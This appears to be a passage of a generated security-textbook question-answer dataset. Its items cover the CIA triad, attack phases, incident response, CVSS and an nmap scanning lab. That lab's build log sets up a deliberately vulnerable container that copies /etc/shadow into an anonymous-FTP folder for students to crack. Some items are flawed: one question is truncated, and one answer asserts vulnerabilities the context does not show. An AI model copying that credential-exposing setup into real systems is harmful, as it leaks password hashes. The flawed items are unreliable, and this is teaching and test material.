AAA\"}\n", "topic": "Detail the relationship between the CIA triad and the overall goal of securing an information system.", "question": "How do the principles of confidentiality, integrity, and availability, as defined by the CIA triad, collectively contribute to establishing a robust security posture for an information system?", "answer": "Balancing confidentiality, integrity, and availability to protect data and ensure system functionality.", "explanation": "The CIA triad represents the core goals of information security. Confidentiality protects sensitive data from unauthorized disclosure, integrity ensures data accuracy and reliability, and availability guarantees access to data when needed. Achieving a strong security posture necessitates balancing and prioritizing these three elements to comprehensively safeguard the system.", "question_token_count": 34, "answer_correctness_score": 8, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 17, "choices": null}
{"context": "### 9.5.2. Resource Development {#_computer_systems_security_planning_for_success.xhtml__resource_development}\nResource development involves acquiring infrastructure from which to deploy an attack. This may involve impersonation or\n\ncustom tailoring exploits based on the results of the previous reconnaissance. In the resource development phase, all\n\nthe actions needed to set the stage for an attack are performed.\n\n:::\n\n::: {.section .sect3 title=\"9.5.3. Initial Access\"}\n\n\n### 9.5.3. Initial Access {#_computer_systems_security_planning_for_success.xhtml__initial_access}\nInitial access refers to the first breach of security. There are many ways for this to occur, but some common ones are\n\nphishing, someone clicks on a link in an email, or through a compromised accounts. Attackers may find it easier to\n\nexploit the underlying software a corporation uses as is the case in a supply chain attack. There are even instances of\n\nattackers leaving rogue flash drives in common areas or attacking WiFi networks from nearby cars.\n\nHowever it is performed, initial access is the first real compromise in an attack.\n\n:::\n\n::: {.section .sect3 title=\"9.5.4. Execution\"}\n", "topic": "Explain how the concept of \"initial access\" represents a significant step in the progression of a cyberattack, as described within the document.", "question": "Considering the diverse methods of initial access outlined in the text, why is establishing this initial foothold considered a pivotal moment in a cyberattack's lifecycle?", "answer": "It establishes the first point of system compromise, enabling further exploitation.", "explanation": "The text explicitly states that initial access represents \u201cthe first real compromise\u201d in an attack. Successfully breaching a system via any of the described methods provides attackers with the opportunity to proceed to subsequent stages of the attack.", "question_token_count": 32, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 14, "choices": null}
{"context": "## 9.7. Lab: Reporting on the 2014 Sony Pictures Hack {#_computer_systems_security_planning_for_success.xhtml__lab_reporting_on_the_2014_sony_pictures_hack}\nTake a moment to read through the details of the [2014 Sony Pictures\n\nHack](https://en.wikipedia.org/wiki/Sony_Pictures_hack){.link}. Feel free to research an used other sources as well.\n\nImagine you are responsible for disclosing the details of the attack to affected parties shortly after it had occurred.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nCome up with two different groups that should receive a disclosure from Sony as a result of the 2014 breach. Write a\n\ndisclosure email for each of them, detailing what happened, what the response was, and what the effect of the party is.\n\nBe sure to keep your audience in mind when determining how much detail and what types of things should be discussed in\n\nthe email.\n\n:::\n\n</aside>\n\n::::\n\n::::::::::::::::::::::::::::::::::::::::::::\n\n:::::::::::::::::::::::: {.section .sect1 title=\"10. Virtualization\"}\n\n\n# 10. Virtualization {#_computer_systems_security_planning_for_success.xhtml__virtualization}\nInformation Technology has seen massive growth in the adoption of virtualization as the underpinning of dynamic and\n\nrobust systems. This shift from bare-metal resources to virtual resources provides its own unique security challenges\n\nand considerations. As the field changes, it is important for anyone working in cybersecurity to not only understand how\n\nthese systems work, but also be able to approach their implementation with a security-first mindset.\n\n::::::::: {.section .sect2 title=\"10.1. Methods\"}\n", "topic": "How would the disclosure email to law enforcement differ from the disclosure email to customers regarding the 2014 Sony Pictures Hack, considering legal and reputational implications?", "question": "Considering the legal and reputational ramifications of a data breach, how would the content and tone of a disclosure email to law enforcement differ from a disclosure email to affected customers regarding the 2014 Sony Pictures Hack?", "answer": "Law enforcement emails detail technical specifics and criminal activity; customer emails prioritize transparency, remediation, and data security commitment.", "explanation": "Law enforcement disclosure would prioritize factual details, technical specifications of the attack, and evidence of criminal activity, adhering to legal reporting requirements. Customer emails must focus on transparency, acknowledging the impact, outlining steps taken for remediation, and demonstrating a commitment to data security.", "question_token_count": 44, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 23, "choices": null}
{"context": "### 9.3.2. Indicators {#_computer_systems_security_planning_for_success.xhtml__indicators}\nThe next level up from a precursor is an indicator. An indicator is an alert showing that an incident has been detected.\n\nThese may be raised by the IDS/IPS, endpoint management system, malware scanners, network devices, or even a user\n\nreport.\n\nOnce and indicator alarm has been triggered, an SOC member must respond and investigate. In the best case scenario the\n\nindicator is telling you that an incident has been detected before too much damage has been done.\n\n:::\n\n:::::\n\n::::::::::::::: {.section .sect2 title=\"9.4. Response\"}\n\n\n## 9.4. Response {#_computer_systems_security_planning_for_success.xhtml__response}\nIn the response phase, the SOC deals with an incident to mitigate the harm it causes. Every incident is different, but\n\nthe governing principles and steps are the same.\n\n::::: {.section .sect3 title=\"9.4.1. Business Continuity\"}\n\n\n### 9.4.1. Business Continuity {#_computer_systems_security_planning_for_success.xhtml__business_continuity}\nThe concept of continuity is central to the steps taken to respond to an incident. Remember that the goal is to keep\n\nthings running and keep services available. Business Continuity has three main parts: Business Continuity Planning\n\n(BCP), Business Impact Analysis (BIA), and Disaster Recovery Planning (DRP).\n\nBusiness Continuity Planning (BCP) is a methodology for keeping things running. With BCP threats are identified in\n\nadvance and critical business processes are prioritized. Recovery procedures for these processes have been developed and\n\ntested. In response to an incident, these procedures are followed as practiced.\n\nBusiness Impact Analysis (BIA) identifies business functions and rates the impact of an outage on these functions. BIA\n\nmeasures the impact of an outage on:\n\n::: itemized-list\n\n- [Property (tangible assets)]{.principal}\n\n- [Finance (monetary funding)]{.principal}\n\n- [Safety (physical protection)]{.principal}\n\n- [Reputation (status)]{.principal}\n\n- [Life (well being)]{.principal}\n\n- [Customers]{.principal}\n\n:::\n\nBIA can help pinpoint mission-essential functions and single points of failure. This allows SOCs to determine where\n\nthere resources should go in terms of having the best chance of maintaining business continuity.\n\nFinally having a Disaster Recovery Plan (DRP) makes it easier to recover in the case of a large-scale issue. Disaster\n\nRecovery (DR) entails policies, tools, and procedures to recover from an outage. DRPs will detail order of restoration\n\nand require a lot of testing to ensure that the entire suite of supported applications can be brought back up. A\n\nstandard DRP will detail:\n\n::: itemized-list\n\n- [Purpose and Scope]{.principal}\n\n- [Recovery Team]{.principal}\n\n- [Preparing for a Disaster]{.principal}\n\n- [Emergency Procedures or Incident Response During an Incident]{.principal}\n\n- [Restoration Procedures and Return to Normal]{.principal}\n\n:::\n\n:::::\n\n::::::: {.section .sect3 title=\"9.4.2. Redundancy\"}\n", "topic": "Explain the relationship between Business Continuity Planning (BCP), Business Impact Analysis (BIA), and Disaster Recovery Planning (DRP) in the context of incident response.", "question": "How do Business Continuity Planning (BCP), Business Impact Analysis (BI", "answer": "BCP leverages BIA\u2019s prioritization to guide DRP, ensuring critical business functions are recovered first, ultimately aiming to maintain or swiftly restore business operations during an incident.", "explanation": "The answer should describe how BCP uses the prioritization established by BIA to inform the recovery procedures detailed in DRP, ensuring that the most critical business functions are addressed first during a disruption. It should also articulate that the overall goal is to maintain or swiftly restore business operations, minimizing disruption and damage.", "question_token_count": 15, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 2, "question_groundedness_score": 9, "avg_answer_token_count": 35, "choices": null}
{"context": "### 10.1.5. PaaS {#_computer_systems_security_planning_for_success.xhtml__paas}\nPaaS stands for platform as a service and refers to a higher-level service that deploys an application in an already\n\nestablished environment running on an IaaS service. Heroku is a great example of this type of service.\n\nHeroku supports many different applications, but they all work in relatively the same manner: Imagine there is a git\n\nrepository of a Django web application that needs to be deployed. Heroku will take an Amazon EC2 instance running on\n\nAWS, clone the repo, install a Python virtual environment with the needed dependencies, and install a production Django\n\nweb server on the system.\n\nWhile the user could take these steps themselves, PaaS makes it easier to deploy an application.\n\n:::\n\n::: {.section .sect3 title=\"10.1.6. SaaS\"}\n\n\n### 10.1.6. SaaS {#_computer_systems_security_planning_for_success.xhtml__saas}\nSoftware as a service (SaaS) is a methodology that we are quite used to. SaaS takes a web application and makes it\n\navailable for a subscription. Some examples would be Webex, Dropbox, Google Workspace, etc. SaaS is a popular way to\n\nmonitize software.\n\nOne of the security concerns with SaaS is that it consolidates information with a single provider. If the server running\n\nthe software is compromised, the PII of millions of people may be leaked.\n\n:::\n\n:::::::::\n\n::::::: {.section .sect2 title=\"10.2. Cloud Computing\"}\n", "topic": "Identify a key security concern associated with Software as a Service (SaaS) as described in the text.", "question": "What is the primary security risk presented by Software as a Service (SaaS) according to the provided text?", "answer": "Data leakage due to a compromised provider\u2019s server.", "explanation": "The text explicitly states that a key concern with SaaS is the consolidation of information with a single provider, which could lead to data leakage if the provider's server is compromised.", "question_token_count": 24, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 11, "choices": null}
{"context": "### 8.1.2. CVSS {#_computer_systems_security_planning_for_success.xhtml__cvss}\n<figure class=\"image right\">\n\n<div class=\"content\">\n\n<img src=\"images/cvss.svg\" alt=\"cvss\" />\n\n</div>\n\n</figure>\n\nThe Common Vulnerability Scoring System is a system used to assess the severity of exploits and vulnerabilities. Once a\n\nCVE is created a CVSS is also creating, taking into account the prevalence of the exploit, its ease of use, and its\n\nability to do harm. CVSSs use a scale of zero to ten, zero being the least severe and ten being the most severe:\n\n::: itemized-list\n\n- [0.0: None]{.principal}\n\n- [0.1-3.9: Low]{.principal}\n\n- [4.0-6.9: Medium]{.principal}\n\n- [7.0-8.9: High]{.principal}\n\n- [9.0-10.0: Critical]{.principal}\n\n:::\n\nCVSSs are researched and maintained by the National Infrastructure Advisory Council (NIAC). A CVSS score is a very\n\nimportant tool used in the next phase we will discuss, evaluation.\n\n::::\n\n::: {.section .sect3 title=\"8.1.3. Evaluation\"}\n\n\n### 8.1.3. Evaluation {#_computer_systems_security_planning_for_success.xhtml__evaluation}\nOnce information has been gathered and the threats are understood it is time to perform an evaluation.\n\nA security team needs to take into account the costs of asset. If this device was to go down how damaging would that be\n\nto the company? If it needed to be replaced how much would it cost?\n\nThe value of the data also needs to be assessed. Is that data sensitive? Is it mission critical to the functioning of\n\nthe company? What would happen if we lost this data?\n\nThe value of an asset or data to a bad actor also needs to be assessed. Is there sensitive data that could be sold?\n\nCould the leaked data compromise the companies long-term goals? Could the data be used to cause an outage?\n\nLegal consequences of a vulnerability should also be assessed. Will there be fines or lawsuits if this vulnerability is\n\nexploited?\n\nFinally reputational consequences should be evaluated. Will there be a loss of customers if this threat is realized?\n\nWill a breach undermine the trust people place in us?\n\n:::\n\n::::::::\n\n:::::::::::: {.section .sect2 title=\"8.2. Compliance\"}\n", "topic": "What are the different severity levels within the CVSS scoring system, and what do they represent in terms of potential impact?", "question": "Considering the CVSS severity scale, how would a vulnerability affecting a critical company database containing sensitive customer information, with the potential to cause significant financial loss and reputational damage, be classified, and what implications does this classification carry?", "answer": "Critical", "explanation": "The text indicates that a CVSS score of 9.0-10.0 represents a \"Critical\" severity level. A vulnerability impacting a critical database with substantial potential for financial loss and reputational damage would therefore be classified as Critical, demanding immediate attention and resource allocation.", "question_token_count": 46, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 2, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Recognizing the potential risks associated with running vulnerable services on a network.", "question": "Based on the provided context, identify at least three potential security vulnerabilities present on the \u2018victim\u2019 machine and explain how nmap\u2019s -A option helped reveal these risks.", "answer": "The vulnerabilities include a known root password, a vulnerable FTP service (allowing anonymous login), and an outdated operating system.", "explanation": "The \u2018victim\u2019 machine, running ProFTPD, has several vulnerabilities. The default root password is known, potentially allowing unauthorized access. The FTP service itself is susceptible to various attacks, including anonymous login. The OS fingerprinting via nmap\u2019s -A reveals the system is running an older Debian version, potentially with known security flaws.", "question_token_count": 36, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 24, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global 